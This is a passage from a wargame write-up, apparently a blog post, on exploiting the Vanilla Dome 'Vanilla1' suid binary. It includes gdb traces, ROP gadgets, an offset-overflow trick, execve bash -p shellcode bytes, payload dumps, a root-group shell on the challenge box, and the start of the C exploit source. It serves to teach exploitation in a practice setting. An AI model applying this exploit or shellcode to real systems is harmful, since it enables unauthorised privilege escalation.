   0x8048686 &lt;main+270&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x8],eax
   0x804868a &lt;main+274&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x4],0x14
   0x8048692 &lt;main+282&gt;:    lea    eax,[esp+0x1038]
   0x8048699 &lt;main+289&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x804869c &lt;main+292&gt;:    call   0x80483e4 &lt;fgets@plt&gt;
   0x80486a1 &lt;main+297&gt;:    <span class="nb">test   </span>eax,eax
<span class="nt">--------------------------------------------------------------------------------</span>

Breakpoint 1, 0x0804867d <span class="k">in </span>main <span class="o">()</span>
gdb<span class="nv">$ </span>gdb<span class="nv">$ </span>p/x <span class="nv">$ebp</span><span class="nt">-0x1020</span>
<span class="nv">$1</span> <span class="o">=</span> 0xb3d35e38
gdb<span class="nv">$ </span>c
<span class="nt">--------------------------------------------------------------------------</span><span class="o">[</span>regs]
  EAX: 00000000  EBX: 9CB15E54  ECX: 00000001  EDX: 4876E800  o d I t s Z a P c 
  ESI: 00000000  EDI: 00000000  EBP: B3D36E58  ESP: B3D35DFC  EIP: 08048577
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
<span class="o">[</span>007B:B3D35DFC]----------------------------------------------------------[stack]
B3D35E4C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E3C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E2C : F1 FF FF FF  00 E8 76 48 - C8 61 05 08  00 00 00 00 ......vH.a......
B3D35E1C : 02 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E0C : 00 00 00 00  00 00 00 00 - 00 00 00 00  04 6F D3 B3 .............o..
B3D35DFC : 00 E8 76 48  F1 FF FF FF - 00 E8 76 48  38 5E D3 B3 ..vH......vH8^..
<span class="o">[</span>007B:B3D35DFC]-----------------------------------------------------------[data]
B3D35DFC : 00 E8 76 48  F1 FF FF FF - 00 E8 76 48  38 5E D3 B3 ..vH......vH8^..
B3D35E0C : 00 00 00 00  00 00 00 00 - 00 00 00 00  04 6F D3 B3 .............o..
B3D35E1C : 02 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E2C : F1 FF FF FF  00 E8 76 48 - C8 61 05 08  00 00 00 00 ......vH.a......
B3D35E3C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E4C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E5C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
B3D35E6C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
<span class="o">[</span>0073:08048577]-----------------------------------------------------------[code]
<span class="o">=&gt;</span> 0x8048577 &lt;insert+67&gt;:    ret   
   0x8048578 &lt;main&gt;:    push   ebp
   0x8048579 &lt;main+1&gt;:    mov    ebp,esp
   0x804857b &lt;main+3&gt;:    and    esp,0xfffffff0
   0x804857e &lt;main+6&gt;:    sub    esp,0x1050
   0x8048584 &lt;main+12&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8]
   0x8048587 &lt;main+15&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x1c],eax
   0x804858b &lt;main+19&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
<span class="nt">--------------------------------------------------------------------------------</span>

Breakpoint 2, 0x08048577 <span class="k">in </span>insert <span class="o">()</span>
gdb<span class="nv">$ </span>x/10wx <span class="nv">$esp</span>
0xb3d35dfc:    0x08048767    0xfffffff1    0x08048767    0xb3d35e38
0xb3d35e0c:    0x00000000    0x00000000    0x00000000    0xb3d36f04
0xb3d35e1c:    0x00000002    0x00000000
</pre></td></tr></tbody></table></code></pre></figure>

<ul>
  <li>0x08048767 is our rewritten SEIP :)</li>
  <li>0xfffffff1 is -15</li>
  <li>0x08048767 the value we gave</li>
  <li>0xb3d35e38 is our buffer value</li>
  <li>0xb3d36f04 point to env[]</li>
</ul>

<p>Ok, great, we have a pointer to our buffer.
We now need an instruction of style pop pop ret.</p>

<h1 id="exploitation-pop-pop-ret-style">Exploitation POP-POP-RET style</h1>

<p>First, we need our pop-pop-ret.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="nv">$ </span>objdump <span class="nt">-d</span> ./Vanilla1
...
 8048767:    5b                       pop    %ebx
 8048768:    5d                       pop    %ebp
 8048769:    c3                       ret   
...
</pre></td></tr></tbody></table></code></pre></figure>

<p>Here we go.</p>

<p>The trigger is thus done this way:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="code"><pre>    <span class="c1">// fill array with shellcode</span>
    <span class="n">fill_array</span> <span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">n_elts</span><span class="p">,</span> <span class="n">fp_in</span><span class="p">);</span>
    <span class="c1">// set trigger</span>
    <span class="n">array</span><span class="p">[</span><span class="n">n_elts</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="n">i2a</span> <span class="p">(</span><span class="mh">0x8048767</span><span class="p">);</span>
    <span class="n">array</span><span class="p">[</span><span class="n">n_elts</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">offset</span> <span class="o">=</span> <span class="n">i2a</span><span class="p">(</span><span class="o">-</span><span class="mi">15</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></pre></figure>

<ul>
  <li>0x8048767 is the address to the pop-pop-ret.</li>
  <li>-15 is the offset to SEIP.</li>
</ul>

<p>Now we should have everything we need for reliable exploitation.</p>

<p>Let’s try our sploit.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="code"><pre>m101@m101-laptop:~/challenges/vanilla_dome<span class="nv">$ </span>./exploit1.rev1 bash-p.bin payload.bin 
sz_file <span class="o">=</span> 33
rest    <span class="o">=</span> 1
n_elts  <span class="o">=</span> 9
2d 31 37 32 32 32 38 33 31 35 38 61 61 61 61 61 61 61 61 | <span class="nt">-1722283158aaaaaaaa</span>
30 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 0aaaaaaaaaaaaaaaaaa
37 36 31 38 31 36 36 35 38 61 61 61 61 61 61 61 61 61 61 | 761816658aaaaaaaaaa
31 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1aaaaaaaaaaaaaaaaaa
31 33 39 30 35 31 32 34 39 36 61 61 61 61 61 61 61 61 61 | 1390512496aaaaaaaaa
32 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 2aaaaaaaaaaaaaaaaaa
37 39 35 33 37 31 36 32 36 61 61 61 61 61 61 61 61 61 61 | 795371626aaaaaaaaaa
33 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 3aaaaaaaaaaaaaaaaaa
31 37 35 32 33 39 32 30 33 34 61 61 61 61 61 61 61 61 61 | 1752392034aaaaaaaaa
34 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 4aaaaaaaaaaaaaaaaaa
31 38 35 32 34 30 30 31 37 35 61 61 61 61 61 61 61 61 61 | 1852400175aaaaaaaaa
35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 5aaaaaaaaaaaaaaaaaa
31 33 36 34 33 38 36 36 39 37 61 61 61 61 61 61 61 61 61 | 1364386697aaaaaaaaa
36 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 6aaaaaaaaaaaaaaaaaa
2d 38 34 30 38 35 37 32 36 31 61 61 61 61 61 61 61 61 61 | <span class="nt">-840857261aaaaaaaaa</span>
37 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 7aaaaaaaaaaaaaaaaaa
31 32 38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 128aaaaaaaaaaaaaaaa
38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 8aaaaaaaaaaaaaaaaaa
31 33 34 35 31 34 35 33 35 61 61 61 61 61 61 61 61 61 61 | 134514535aaaaaaaaaa
2d 31 35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | <span class="nt">-15aaaaaaaaaaaaaaaa</span>

On the remote machine:
vanilla1@VanillaDome /tmp <span class="nv">$ </span>~/Vanilla1 v1.1.txt
Segmentation fault
</pre></td></tr></tbody></table></code></pre></figure>

<p>Woot! It doesn’t work!</p>

<p>Let’s check the stack.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre>gdb<span class="nv">$ </span>b <span class="k">*</span>0x08048577
Breakpoint 1 at 0x8048577
gdb<span class="nv">$ </span>condition 1 <span class="nv">$edx</span><span class="o">==</span>0x8048767
gdb<span class="nv">$ </span>r payload.bin
</pre></td></tr></tbody></table></code></pre></figure>

<p>We break as soon as edx == 0x8048577 (which is our last value).</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre>gdb<span class="nv">$ </span>x/10wx <span class="nv">$esp</span>
0xb3d35dfc:    0x08048767    0xfffffff1    0x08048767    0xb3d35e38
0xb3d35e0c:    0x00000000    0x00000000    0x00000000    0xb3d36f04
0xb3d35e1c:    0x00000002    0x00000000

gdb<span class="nv">$ </span>x/10wx 0xb3d35e38
0xb3d35e38:    0x00000000    0x2d686652    0x52e18970    0x2f68686a
0xb3d35e48:    0x68736162    0x6e69622f    0x5152e389    0xcde18953
0xb3d35e38:    0x00000080    0x00000000
</pre></td></tr></tbody></table></code></pre></figure>

<p>Whoops, the first 4 bytes are never written.</p>

<p>That’s explained by the fact that insert() isn’t called if atoll() return 0.</p>

<p>We can fix it through 2 methods:</p>

<ul>
  <li>put our payload somewhere else in the stack</li>
  <li>use arithmetic tricks</li>
</ul>

<h1 id="putting-our-payload-somewhere-else">Putting our payload somewhere else</h1>

<p>Remember about 0xb3d36f04 ?</p>

<p>This is our env[] pointer.</p>

<p>We need an address in stack to use the same trick as before with the pop-pop-ret.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre>gdb<span class="nv">$ </span>x/10wx 0xb3d36f04
0xb3d36f04:    0xbd4dea72    0xbd4dea8a    0x00000000    0xbd4dea93
0xb3d36f14:    0xbd4deb25    0xbd4deb35    0xbd4deb40    0xbd4deb64
0xb3d36f24:    0xbd4deb77    0xbd4deb85
</pre></td></tr></tbody></table></code></pre></figure>

<p>If you check each pointers:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre>gdb<span class="nv">$ </span>x/s 0xbd4dea72
0xbd4dea72:     <span class="s2">"/home/vanilla1/Vanilla1"</span>
gdb<span class="nv">$ </span>x/s 0xbd4dea8a
0xbd4dea8a:     <span class="s2">"payload.bin"</span>
gdb<span class="nv">$ </span>x/s 0xbd4deb64
0xbd4deb64:     <span class="s2">"SSH_TTY=/dev/pts/0"</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p>You get environment values.
We can trash those pointers, we don’t really need them (our shell won’t be happy
but it’ll still work).</p>

<p>In order to overwrite those pointers, we need our offset:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>0xb3d36f04 - 0xb3d35e38 = 0x10CC = 4300
</pre></td></tr></tbody></table></code></pre></figure>

<p>And we need to pop 6 values out of the stack.
For that, I chose 2 gadgets chained together:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre>0x08048735: pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
0x08048503: pop ebp ; ret  ;  (1 found)
</pre></td></tr></tbody></table></code></pre></figure>

<p>Your stack will look like this when the trigger is set up:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre>gdb<span class="nv">$ </span>x/10wx <span class="nv">$esp</span>
0xb3d35dfc:    0x08048735    0xfffffff1    0x08048735    0xb3d35e38
0xb3d35e0c:    0x00000000    0x08048503    0x00000000    0xb3d36f04
0xb3d35e1c:    0x00000002    0x00000000
</pre></td></tr></tbody></table></code></pre></figure>

<p>It will return directly to 0xb3d36f04 and gain code execution.</p>

<p>Let’s try:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="code"><pre>m101@m101-laptop:~/challenges/vanilla_dome<span class="nv">$ </span>./exploit1.rev2 bash-p.bin v1.2txt
sz_file <span class="o">=</span> 33
rest    <span class="o">=</span> 1
n_elts  <span class="o">=</span> 9
6a 0b 58 99                                     | j.X.
52 66 68 2d                                     | Rfh-
70 89 e1 52                                     | p..R
6a 68 68 2f                                     | jhh/
62 61 73 68                                     | bash
2f 62 69 6e                                     | /bin
89 e3 52 51                                     | ..RQ
53 89 e1 <span class="nb">cd</span>                                     | S...
80 00 00 00                                     | ....
2d 31 37 32 32 32 38 33 31 35 38 61 61 61 61 61 61 61 61 | <span class="nt">-1722283158aaaaaaaa</span>
31 30 37 35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1075aaaaaaaaaaaaaaa
37 36 31 38 31 36 36 35 38 61 61 61 61 61 61 61 61 61 61 | 761816658aaaaaaaaaa
31 30 37 36 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1076aaaaaaaaaaaaaaa
31 33 39 30 35 31 32 34 39 36 61 61 61 61 61 61 61 61 61 | 1390512496aaaaaaaaa
31 30 37 37 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1077aaaaaaaaaaaaaaa
37 39 35 33 37 31 36 32 36 61 61 61 61 61 61 61 61 61 61 | 795371626aaaaaaaaaa
31 30 37 38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1078aaaaaaaaaaaaaaa
31 37 35 32 33 39 32 30 33 34 61 61 61 61 61 61 61 61 61 | 1752392034aaaaaaaaa
31 30 37 39 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1079aaaaaaaaaaaaaaa
31 38 35 32 34 30 30 31 37 35 61 61 61 61 61 61 61 61 61 | 1852400175aaaaaaaaa
31 30 38 30 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1080aaaaaaaaaaaaaaa
31 33 36 34 33 38 36 36 39 37 61 61 61 61 61 61 61 61 61 | 1364386697aaaaaaaaa
31 30 38 31 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1081aaaaaaaaaaaaaaa
2d 38 34 30 38 35 37 32 36 31 61 61 61 61 61 61 61 61 61 | <span class="nt">-840857261aaaaaaaaa</span>
31 30 38 32 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1082aaaaaaaaaaaaaaa
31 32 38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 128aaaaaaaaaaaaaaaa
31 30 38 33 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1083aaaaaaaaaaaaaaa
31 33 34 35 31 33 39 32 33 61 61 61 61 61 61 61 61 61 61 | 134513923aaaaaaaaaa
2d 31 30 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | <span class="nt">-10aaaaaaaaaaaaaaaa</span>
31 33 34 35 31 34 34 38 35 61 61 61 61 61 61 61 61 61 61 | 134514485aaaaaaaaaa
2d 31 35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | <span class="nt">-15aaaaaaaaaaaaaaaa</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p>On the challenge machine:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre>vanilla1@VanillaDome /tmp <span class="nv">$ </span>~/Vanilla1 v1.2.txt
bash-4.1<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1014<span class="o">(</span>vanilla1<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1015<span class="o">(</span>vanilla1<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1008<span class="o">(</span>vanilla1crack<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1009<span class="o">(</span>vanilla1crack<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1009<span class="o">(</span>vanilla1crack<span class="o">)</span>,1015<span class="o">(</span>vanilla1<span class="o">)</span>
bash-4.1<span class="nv">$ </span><span class="nb">pwd</span>
/tmp
bash-4.1<span class="nv">$ </span><span class="nb">cd
</span>bash: <span class="nb">cd</span>: HOME not <span class="nb">set
</span>bash-4.1<span class="nv">$ </span><span class="nb">cd</span> ~
bash-4.1<span class="nv">$ </span><span class="nb">pwd</span>
/home/vanilla1
</pre></td></tr></tbody></table></code></pre></figure>

<p>Just so you don’t bang your head, use <a href="http://www.exploit-db.com/exploits/13697/">bash -p</a> payload or you won’t get the suid.</p>

<p>Pawn!</p>

<p>I wanted it to be a bit cleaner.
Trashing the env[], not cool.
Let’s try bypassing that 0 restriction through arithmetic tricks.</p>

<h1 id="arithmetic-trick">Arithmetic trick</h1>

<p>For the careful reader, you may have spotted some interesting line in insert()
code.</p>

<p>If not:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="code"><pre>Dump of assembler code for function insert:
   0x08048534 &lt;+0&gt;:    push   ebp
   0x08048535 &lt;+1&gt;:    mov    ebp,esp
   0x08048537 &lt;+3&gt;:    sub    esp,0x28
   0x0804853a &lt;+6&gt;:    mov    eax,DWORD PTR [ebp+0x8]              ; eax = value2
   0x0804853d &lt;+9&gt;:    mov    DWORD PTR [ebp-0x1c],eax
   0x08048540 &lt;+12&gt;:    mov    eax,DWORD PTR [ebp+0xc]              ; eax = value1
   0x08048543 &lt;+15&gt;:    mov    DWORD PTR [ebp-0x20],eax
   0x08048546 &lt;+18&gt;:    mov    eax,DWORD PTR [ebp+0x10]             ; eax = buffer
   0x08048549 &lt;+21&gt;:    mov    DWORD PTR [ebp-0x24],eax
   0x0804854c &lt;+24&gt;:    mov    eax,gs:0x14                          ; stack cookie
   0x08048552 &lt;+30&gt;:    mov    DWORD PTR [ebp-0xc],eax
   0x08048555 &lt;+33&gt;:    xor    eax,eax
   0x08048557 &lt;+35&gt;:    mov    eax,DWORD PTR [ebp-0x1c]
   0x0804855a &lt;+38&gt;:    shl    eax,0x2                              ; value2 &lt;&lt;= 2;
   0x0804855d &lt;+41&gt;:    add    eax,DWORD PTR [ebp-0x24]             ; value2 += buffer;
   0x08048560 &lt;+44&gt;:    mov    edx,DWORD PTR [ebp-0x20]
   0x08048563 &lt;+47&gt;:    mov    DWORD PTR [eax],edx                  ; *value2 = value1;
   ; stack cookie check
   0x08048565 &lt;+49&gt;:    mov    eax,DWORD PTR [ebp-0xc]              ; stack cookie
   0x08048568 &lt;+52&gt;:    xor    eax,DWORD PTR gs:0x14
   0x0804856f &lt;+59&gt;:    je     0x8048576 &lt;insert+66&gt;

   0x08048571 &lt;+61&gt;:    call   0x8048444 &lt;__stack_chk_fail@plt&gt;
   0x08048576 &lt;+66&gt;:    leave 
   0x08048577 &lt;+67&gt;:    ret   
End of assembler dump.
</pre></td></tr></tbody></table></code></pre></figure>

<p>The interesting line is here:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>0x0804855a &lt;+38&gt;:    shl    eax,0x2                              ; value2 &lt;&lt;= 2;
</pre></td></tr></tbody></table></code></pre></figure>

<p>Our offset is multiplied by 4.</p>

<p>We can thus manage to overflow our offset so it becomes 0.</p>

<p>We want 0x1 0000 0000 so offset will be equal to 0x4000 0000.</p>

<p>That’s how we get the zero!</p>

<p>Let’s try:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="code"><pre>m101@m101-laptop:~/challenges/vanilla_dome<span class="nv">$ </span>./exploit1 bash-p.bin payload.bin 
sz_file <span class="o">=</span> 33
rest    <span class="o">=</span> 1
n_elts  <span class="o">=</span> 9
6a 0b 58 99                                     | j.X.
52 66 68 2d                                     | Rfh-
70 89 e1 52                                     | p..R
6a 68 68 2f                                     | jhh/
62 61 73 68                                     | bash
2f 62 69 6e                                     | /bin
89 e3 52 51                                     | ..RQ
53 89 e1 <span class="nb">cd</span>                                     | S...
80 00 00 00                                     | ....
2d 31 37 32 32 32 38 33 31 35 38 61 61 61 61 61 61 61 61 | <span class="nt">-1722283158aaaaaaaa</span>
31 30 37 33 37 34 31 38 32 34 61 61 61 61 61 61 61 61 61 | 1073741824aaaaaaaaa
37 36 31 38 31 36 36 35 38 61 61 61 61 61 61 61 61 61 61 | 761816658aaaaaaaaaa
31 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1aaaaaaaaaaaaaaaaaa
31 33 39 30 35 31 32 34 39 36 61 61 61 61 61 61 61 61 61 | 1390512496aaaaaaaaa
32 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 2aaaaaaaaaaaaaaaaaa
37 39 35 33 37 31 36 32 36 61 61 61 61 61 61 61 61 61 61 | 795371626aaaaaaaaaa
33 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 3aaaaaaaaaaaaaaaaaa
31 37 35 32 33 39 32 30 33 34 61 61 61 61 61 61 61 61 61 | 1752392034aaaaaaaaa
34 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 4aaaaaaaaaaaaaaaaaa
31 38 35 32 34 30 30 31 37 35 61 61 61 61 61 61 61 61 61 | 1852400175aaaaaaaaa
35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 5aaaaaaaaaaaaaaaaaa
31 33 36 34 33 38 36 36 39 37 61 61 61 61 61 61 61 61 61 | 1364386697aaaaaaaaa
36 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 6aaaaaaaaaaaaaaaaaa
2d 38 34 30 38 35 37 32 36 31 61 61 61 61 61 61 61 61 61 | <span class="nt">-840857261aaaaaaaaa</span>
37 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 7aaaaaaaaaaaaaaaaaa
31 32 38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 128aaaaaaaaaaaaaaaa
38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 8aaaaaaaaaaaaaaaaaa
31 33 34 35 31 34 35 33 35 61 61 61 61 61 61 61 61 61 61 | 134514535aaaaaaaaaa
2d 31 35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | <span class="nt">-15aaaaaaaaaaaaaaaa</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p>On the remote machine:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre>vanilla1@VanillaDome /tmp <span class="nv">$ </span>~/Vanilla1 v1.3.txt
bash-4.1<span class="nv">$ </span><span class="nb">pwd</span>
/tmp
bash-4.1<span class="nv">$ </span><span class="nb">cd
</span>bash: <span class="nb">cd</span>: HOME not <span class="nb">set
</span>bash-4.1<span class="nv">$ </span><span class="nb">pwd</span>
/tmp
bash-4.1<span class="nv">$ </span><span class="nb">cd</span> ~
bash-4.1<span class="nv">$ </span><span class="nb">pwd</span>
/home/vanilla1
</pre></td></tr></tbody></table></code></pre></figure>

<p>Challenge completely owned :).</p>

<h1 id="conclusion">Conclusion</h1>

<p>As you can see, with a bit of work, motivation and some vulnerability, you can
bypass protections.</p>

<p>ASLR was of no use here as we bypass it through offsets and pointers laying on
the stack.</p>

<p>RELRO didn’t stop us as we can write on the stack with a write-what-where.</p>

<p>If NX were to be set, it wouldn’t have stopped us either as we can still craft a
rop chain. The problem would more have to been about the number of available
gadgets.</p>

<p>That’s all for today, hope you enjoyed it.</p>

<p>Cheers,</p>

<p>m_101</p>

<h1 id="resources">Resources</h1>

<ul>
  <li><a href="http://www.exploit-db.com/exploits/13697/">bash -p payload</a></li>
  <li><a href="http://www.sm0k.org/dojo/vanilla.php">Vanilla Dome Wargame</a></li>
  <li><a href="https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/">RELRO: RELocation Read-Only</a></li>
  <li><a href="http://www.segmentationfault.fr/linux/role-plt-got-ld-so/">Reversing Linux : Comprendre le rôle des sections PLT et GOT dans l’édition de liens dynamique</a></li>
</ul>

<h1 id="annex-the-exploit">Annex: The exploit</h1>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
</pre></td><td class="code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="cp">#include &lt;string.h&gt;
</span>
<span class="cp">#include &lt;stdint.h&gt;
</span>
<span class="k">struct</span> <span class="n">dpatch_t</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">value</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">offset</span><span class="p">;</span>
<span class="p">};</span>

<span class="cm">/*
 8048767:    5b                       pop    %ebx
 8048768:    5d                       pop    %ebp
 8048769:    c3                       ret
*/</span>

<span class="kt">int</span> <span class="nf">get_fsize</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">);</span>
<span class="kt">int</span> <span class="nf">get_nelts</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">);</span>
<span class="kt">char</span> <span class="o">*</span><span class="nf">i2a</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">value</span><span class="p">);</span>
<span class="k">struct</span> <span class="n">dpatch_t</span> <span class="o">*</span><span class="nf">fill_array</span> <span class="p">(</span><span class="kt">int</span> <span class="n">off_buffer</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dpatch_t</span> <span class="o">*</span><span class="n">array</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n_elts</span><span class="p">,</span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">);</span>
<span class="kt">int</span> <span class="nf">dump</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">bytes</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">align</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">n_elts</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">idx_array</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">dpatch_t</span> <span class="o">*</span><span class="n">array</span><span class="p">;</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp_in</span><span class="p">,</span> <span class="o">*</span><span class="n">fp_out</span><span class="p">;</span>

